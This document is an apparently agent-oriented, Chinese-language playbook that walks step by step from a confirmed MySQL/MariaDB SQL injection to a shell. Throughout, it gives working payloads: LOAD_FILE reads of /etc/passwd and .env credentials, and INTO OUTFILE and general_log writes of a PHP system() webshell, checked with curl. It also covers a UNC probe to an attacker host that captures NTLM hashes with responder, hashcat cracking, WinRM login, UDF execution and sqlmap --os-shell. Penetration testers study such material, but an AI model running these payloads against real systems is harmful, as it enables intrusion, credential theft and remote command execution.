# MySQL / MariaDB SQLi → Shell 完整攻击链

> 前置：已经通过 HTTP/Web 输入确认 SQL Injection，且后端指纹为 MySQL/MariaDB。
>
> 本文件不处理扫描发现 3306 后的直接数据库登录；那属于 `/recon`/服务流程。本文件只负责 **已确认 SQLi → 文件/OS primitive → Shell**。

---

## 第1步 权限与环境枚举

```sql
SELECT USER(),CURRENT_USER(),@@version,@@hostname,@@secure_file_priv;
SHOW GRANTS;
```

重点判断：

```text
FILE privilege?
secure_file_priv = NULL        → server-side file import/export被禁
secure_file_priv = /path/      → 只能在指定目录
secure_file_priv = empty       → 不限制目录，但仍需 FILE + OS文件权限
WebRoot是否已知？
mysqld OS账户能否写WebRoot？
目标OS是Linux还是Windows？
是否有SUPER / SYSTEM_VARIABLES_ADMIN等全局变量权限？
```

盲注场景只抽取必要信息，不要一开始 dump 全库。

---

## 第2步 路径选择

```text
FILE + 已知WebRoot + 可写
    → INTO OUTFILE / DUMPFILE → WebShell

可修改全局日志变量 + WebRoot可写
    → general_log → WebShell

Windows + FILE/UNC primitive
    → NTLM credential pivot → 如能换远程Shell则完成

只有文件读取
    → .env / config / web.config / SSH key / 凭据
    → 回到Web/远程管理入口寻找Shell

高权限且环境允许UDF
    → UDF OS execution（fallback）
```

---

## 第3步 文件读取

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/.env');
SELECT LOAD_FILE('C:/inetpub/wwwroot/web.config');
```

SQLi 示例：

```sql
' UNION SELECT 1,2,LOAD_FILE('/var/www/html/.env'),4,5-- //
```

高价值文件：

```text
/var/www/html/.env
/var/www/*/config.php
/etc/nginx/sites-enabled/*
C:\inetpub\wwwroot\web.config
应用配置文件中的DB/SSH/API凭据
```

文件读取本身不是 `/web-attack` 成功条件；利用获得的凭据/路径继续寻找 Shell。

---

## 第4步 `INTO OUTFILE` / `DUMPFILE` → WebShell

条件：

```text
FILE privilege
+
secure_file_priv允许目标目录
+
mysqld OS账户可写目标目录
+
Web服务器会执行对应脚本类型
```

PHP 靶场示例：

```sql
SELECT '<?php system($_GET["cmd"]);?>'
INTO OUTFILE '/var/www/html/tmp/shell.php';
```

通过 UNION SQLi 时需要匹配原查询列数/位置，例如：

```sql
' UNION SELECT '<?php system($_GET["cmd"]);?>',NULL,NULL
INTO OUTFILE '/var/www/html/tmp/shell.php'-- //
```

验证：

```bash
curl 'http://TARGET/tmp/shell.php?cmd=id'
```

返回稳定 OS 命令结果 → WebShell / command execution confirmed。

若需要交互式 Shell，再从已确认 WebShell 触发靶场允许的 reverse shell；拿到 Shell 后 `/web-attack COMPLETE`。

### 常见失败

```text
Can't create/write to file       → OS权限/目录不存在
secure_file_priv restriction     → 只能写允许目录
File already exists              → OUTFILE不覆盖，换文件名
HTTP 404                         → WebRoot判断错误
脚本源码原样返回                  → 目录不解析该脚本类型
```

---

## 第5步 General Query Log → WebShell

这条链**不是“有 FILE 就能做”**。需要修改全局日志变量的权限（常见 `SYSTEM_VARIABLES_ADMIN` 或旧版本 `SUPER`），并且 MySQL OS 用户能写 WebRoot。

先记录原状态：

```sql
SELECT @@global.general_log,
       @@global.general_log_file,
       @@global.log_output;
SHOW GRANTS;
```

满足条件后：

```sql
SET GLOBAL log_output='FILE';
SET GLOBAL general_log_file='/var/www/html/tmp/mysql-log.php';
SET GLOBAL general_log=ON;

SELECT '<?php system($_GET["cmd"]);?>';

SET GLOBAL general_log=OFF;
```

验证：

```bash
curl 'http://TARGET/tmp/mysql-log.php?cmd=id'
```

### 恢复

恢复测试前记录的：

```text
general_log
general_log_file
log_output
```

不要把 general log 长期开启。

---

## 第6步 Windows MySQL → UNC / NTLM 凭据 pivot

条件：

```text
MySQL运行在Windows
+
当前SQLi上下文能触发服务器UNC访问
+
目标到攻击机SMB/DNS网络可达
```

探针：

```sql
SELECT LOAD_FILE('\\ATTACKER\share\probe');
```

Kali：

```bash
sudo responder -I tun0
# 或仅SMB监听
sudo impacket-smbserver share . -smb2support
```

如果得到服务账户 NTLMv2：

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**只有凭据最终能换成目标服务器 Shell 才算 `/web-attack` 完成。**

例如已确认目标 WinRM 暴露且该账户有登录权限：

```bash
nxc winrm TARGET -u sqlsvc -p 'Password123'
```

只有凭据、没有 Shell → 记录 credential pivot，继续当前 Web→Shell 路径；不要在本文件展开 AD。

---

## 第7步 UDF OS Execution（条件式 fallback）

仅在高权限、插件目录可控、目标版本/架构和动态库条件满足时评估。

先确认：

```sql
SELECT @@plugin_dir;
SHOW GRANTS;
SELECT @@version_compile_os,@@version_compile_machine;
```

逻辑：

```text
能写 plugin_dir
+
有匹配目标OS/架构的UDF库
+
允许 CREATE FUNCTION ... SONAME
        ↓
UDF command primitive
        ↓
Shell
```

如果 plugin_dir 不可写、`secure_file_priv`/OS ACL 阻断或无法加载共享库，不要在这条链浪费时间，优先回 OUTFILE/general_log/credential pivot。

---

## 第8步 sqlmap 辅助

SQLi 和 DBMS 已确认后再尝试：

```bash
sqlmap -r request.txt -p id --dbms=MySQL --current-user --privileges --batch
sqlmap -r request.txt -p id --dbms=MySQL --file-read=/etc/passwd --batch
```

满足文件写/RCE条件时：

```bash
sqlmap -r request.txt -p id --dbms=MySQL --os-shell --batch
```

`--os-shell` 失败 → 回本文件手工判断 `FILE / secure_file_priv / WebRoot / global variables / OS`，不要把失败等同于“SQLi无法到Shell”。

---

## 成功门控

```text
MySQL SQLi
    ↓
FILE / global log / UDF / credential primitive
    ↓
稳定OS命令执行或WebShell
    ↓
Shell obtained
    ↓
/web-attack COMPLETE
```

拿到 Shell 后停止；本地提权、内网和 AD 交给后续模块。
